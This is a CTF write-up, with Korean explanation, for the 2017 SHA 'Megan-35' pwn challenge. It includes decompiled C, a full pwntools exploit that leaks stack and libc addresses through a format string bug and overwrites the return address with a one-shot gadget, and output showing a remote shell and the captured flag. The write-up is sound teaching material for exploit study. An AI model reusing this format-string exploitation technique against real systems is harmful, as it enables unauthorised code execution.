# 2017 SHA - [PWN] Megan-35

## Key words

- Megan-35 encoder
- FSB
- one-shot gadget in 32bit libc

## Check Security

```
[*] '/home/tbkim/ctf/pwnable/0018_2017_SHA_Megan35/megan-35'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Solution

문제는 다음과 같습니다.

```c
int __cdecl main(int a1)
{
  const char *v1; // eax@1
  int v2; // edx@1
  char s; // [sp+0h] [bp-21Ch]@1
  char dest; // [sp+100h] [bp-11Ch]@1
  int v6; // [sp+200h] [bp-1Ch]@1
  int *v7; // [sp+214h] [bp-8h]@1
  v7 = &a1;
  v6 = *MK_FP(__GS__, 20);
  puts("Decrypt your text with the MEGAN-35 encryption.");
  fflush(stdout);
  fgets(&s, 255, stdin);
  v1 = (const char *)sub_804866B(&s, strlen(&s));
  strcpy(&dest, v1);
  printf(&dest);
  v2 = *MK_FP(__GS__, 20) ^ v6;
  return 0;
}
```

위 위치에서 `FSB`가 발생하며, 문제 명세에서는 ASLR이 비활성화 되어 있다고 되어 있으니, 포멧 스트링을 이용하여 실행해도 변하지 않는 고정적인 값을 찾고, 포멧 스트링의 스택 위치부터 리턴 주소의 오프셋을 계산한 후, 리턴 주소를 원샷 가젯으로 덮습니다.

## Solution code

```python
import string
from pwn import *
context(arch="i386", os="linux")

base64  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF"
t_megan35 = string.maketrans(base64, megan35)

def encode(payload):
	payload = payload.encode("base64")
	return payload.translate(t_megan35).replace("=","@")

DEBUG = False
if len(sys.argv) == 2:
	DEBUG = True

target = "./megan-35"
env = {"LD_PRELOAD": "/home/tbkim/ctf/pwnable/0018_2017_SHA_Megan35/libc.so.6"}
server = "megan35.stillhackinganyway.nl"
port = 3535
p = None

payload = encode("%95$08x")
if DEBUG:
	p = process(target, env=env)
else:
	p = remote(server, port)

print p.recv()
p.sendline(payload)
data = p.recv()
leak = int(data[0:8], 16)
ret = leak + 0x54
buf_addr = leak - 0x1dc
print "RET    : {}".format(hex(ret))
print "BUF    : {}".format(hex(buf_addr))

p.close()

payload = encode("%2$08x")

if DEBUG:
	p = process(target, env=env)
else:
	p = remote(server, port)

print p.recv()
p.sendline(payload)
data = p.recv()
libc_base = int(data[0:8], 16) - 0x1b05a0
one_shot = libc_base + 0x11dc1f
print "LIB      : {}".format(hex(libc_base))
print "ONE-SHOT : {}".format(hex(one_shot))
p.close()

# 7 = &buf_addr
payload = "A"*8         # 7-8 : not used
payload += p32(ret)     # 9
payload += p32(ret+2)   # 10
payload += "B"*8		# 11-12 : not used

word_9 = (one_shot & 0x0000ffff) - 0x12
payload2 = "%{}c%9$hn".format(word_9)
byte_10 = ((one_shot & 0x00ff0000) >> 16) - 0x12

if (word_9 & 0xff) > byte_10:
	byte_10 = 0x100 - (word_9 & 0xff) + byte_10
else:
	byte_10 = byte_10 - (word_9 & 0xff)
payload2 += "%{}c%10$hhn".format(byte_10)

if DEBUG:
	p = process(target, env=env)
else:
	p = remote(server, port)
print p.recvline()
p.sendline(payload + encode(payload2))
p.interactive()
```

## Result

```
hackability@ubuntu:~/Home/TenDollar/ctf/pwnable/0018_2017_SHA_Megan35$ python sol_megan35.py
[+] Opening connection to megan35.stillhackinganyway.nl on port 3535: Done
Decrypt your text with the MEGAN-35 encryption.

RET    : 0xffffddcc
BUF    : 0xffffdb9c
[*] Closed connection to megan35.stillhackinganyway.nl port 3535
[+] Opening connection to megan35.stillhackinganyway.nl on port 3535: Done
Decrypt your text with the MEGAN-35 encryption.

LIB      : 0xf7e19000
ONE-SHOT : 0xf7f36c1f
[*] Closed connection to megan35.stillhackinganyway.nl port 3535
[+] Opening connection to megan35.stillhackinganyway.nl on port 3535: Done
Decrypt your text with the MEGAN-35 encryption.

[*] Switching to interactive mode
뮺뮺1߿9߿????

... snip ...

$ ls
bin
boot
dev
etc
flag
home
initrd.img
initrd.img.old
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ cat flag
flag{43eb404b714b8d22e1168775eba1669c}
```
